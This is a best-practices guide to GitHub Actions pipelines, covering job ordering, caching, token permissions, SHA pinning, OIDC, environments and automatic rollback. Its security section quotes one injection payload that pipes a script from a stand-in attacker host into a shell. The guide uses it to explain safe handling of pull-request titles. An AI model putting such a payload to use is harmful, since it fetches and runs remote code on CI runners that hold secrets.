# CI/CD with GitHub Actions Best Practices

Image tagging, scanning and "build once, promote" are covered in [Docker, K8s & DevOps](docker-k8s-devops.md). This page is about the pipeline itself.

## ⚙️ Pipeline design

### Fail fast, cheapest checks first

Order jobs so that lint, compile and unit tests run before slow integration tests, image builds and deploys. Run independent jobs in parallel.

**Why it's a best practice:** a developer waiting 15 minutes to learn about a typo stops trusting the pipeline. Cheap checks give feedback in a minute and save the runner time of the expensive jobs. `needs:` expresses the order; everything without `needs` runs in parallel.

```yaml
jobs:
  lint:   { runs-on: ubuntu-latest, steps: [ ... ] }
  unit:   { runs-on: ubuntu-latest, steps: [ ... ] }
  integration:
    needs: [lint, unit]          # only starts if the cheap jobs pass
    runs-on: ubuntu-latest
    steps: [ ... ]
```

### Cache dependencies and test on a matrix only where it matters

Use the built-in cache of the setup action, and a `matrix` for versions you actually support.

**Why it's a best practice:** downloading all Maven or npm dependencies on every run costs minutes for no reason. A matrix catches "works on 21, breaks on 25" but multiplies cost: don't matrix over things you don't ship.

```yaml
unit:
  runs-on: ubuntu-latest
  strategy:
    matrix: { java: [21, 25] }
  steps:
    - uses: actions/setup-java@v4
      with: { distribution: temurin, java-version: "${{ matrix.java }}", cache: maven }
```

### Cancel superseded runs

Use `concurrency` so a new push cancels the previous run of the same branch, but never cancel a deploy halfway.

**Why it's a best practice:** five quick pushes to a PR otherwise queue five full pipelines. Cancelling a half-finished deployment, on the other hand, can leave an environment in a broken state.

```yaml
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}
```

### Reuse workflows instead of copy-pasting YAML

Put shared steps in a reusable workflow (`workflow_call`) or a composite action.

**Why it's a best practice:** ten services with ten copies of the same 80 lines means every fix (a new scanner, a new Java version) is ten PRs, and the copies drift.

```yaml
# service repo
jobs:
  ci:
    uses: my-org/pipelines/.github/workflows/java-ci.yml@v3
    with: { java-version: "21" }
    secrets: inherit
```

## 🔐 Security of the pipeline

### Give the token the least permissions

Set `permissions: contents: read` at the top of the workflow, and raise it per job only where needed.

**Why it's a best practice:** the default `GITHUB_TOKEN` can often write to the repo. A compromised dependency or a malicious PR step then gets write access. Least privilege limits the blast radius.

```yaml
permissions: { contents: read }
jobs:
  publish:
    permissions: { contents: read, packages: write }
```

### Pin third-party actions to a commit SHA

Reference `uses: owner/action@<full-sha>` (with a version comment), and let Dependabot or Renovate update it.

**Why it's a best practice:** a tag like `@v4` can be moved by the action's owner, or by an attacker who steals their account, and your pipeline runs the new code with your secrets. A SHA is immutable.

```yaml
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

### Use OIDC instead of long-lived cloud keys

Let the job request a short-lived token from the cloud provider, rather than storing an access key in secrets.

**Why it's a best practice:** a stored key never expires, is copied into every fork's settings by mistake, and leaks silently. An OIDC token lives minutes and the cloud-side trust policy can restrict it to one repo and branch.

```yaml
permissions: { id-token: write, contents: read }
steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with: { role-to-assume: arn:aws:iam::123456789012:role/deploy, aws-region: eu-west-1 }
```

### Never run untrusted code with secrets

Don't use `pull_request_target` to check out and run code from a fork. Never interpolate `${{ github.event.* }}` directly into a `run:` script.

**Why it's a best practice:** `pull_request_target` runs with the base repo's secrets; running the PR's code there hands them to the author. Interpolating a PR title into a shell script is command injection (`"; curl evil.sh | sh #`). Pass it through an environment variable instead.

```yaml
# ⛔ injection
- run: echo "${{ github.event.pull_request.title }}"
# ✅
- run: echo "$TITLE"
  env: { TITLE: "${{ github.event.pull_request.title }}" }
```

## 🚦 Quality gates & delivery

### Enforce gates on the pull request, not after merge

Make the CI checks required in branch protection: tests, coverage threshold on new code, static analysis (SonarQube), dependency and image scan.

**Why it's a best practice:** a gate that can be ignored is a suggestion. Checking only the new code's coverage keeps the bar reachable on legacy projects, where a global threshold is either ignored or blocks everything.

### Protect production with environments

Use GitHub `environments` with required reviewers for production, and environment-scoped secrets.

**Why it's a best practice:** staging can deploy automatically on merge, while production waits for a human, and only jobs targeting `production` can read production secrets.

```yaml
deploy-prod:
  needs: deploy-staging
  environment: production      # pauses until a reviewer approves
```

### Make deploys roll back on their own

Deploy with a health check and automatic rollback (`helm upgrade --atomic`, `kubectl rollout status` then `rollout undo`). Smoke-test after deploy.

**Why it's a best practice:** a pipeline that reports "green" after pushing a broken version is worse than no pipeline. Waiting for readiness and undoing on failure turns an outage into a failed run.

```yaml
- run: |
    kubectl set image deploy/orders orders=$IMAGE
    kubectl rollout status deploy/orders --timeout=120s || { kubectl rollout undo deploy/orders; exit 1; }
```

### Keep the pipeline fast and observable

Track pipeline duration and flakiness, and quarantine flaky tests instead of re-running until green.

**Why it's a best practice:** a pipeline that takes 40 minutes and fails randomly is bypassed. Lead time and change failure rate (DORA metrics) start with a fast, trusted pipeline.

⛔ "just re-run it"
✅ tag the flaky test, fix it within the sprint, keep the main suite deterministic
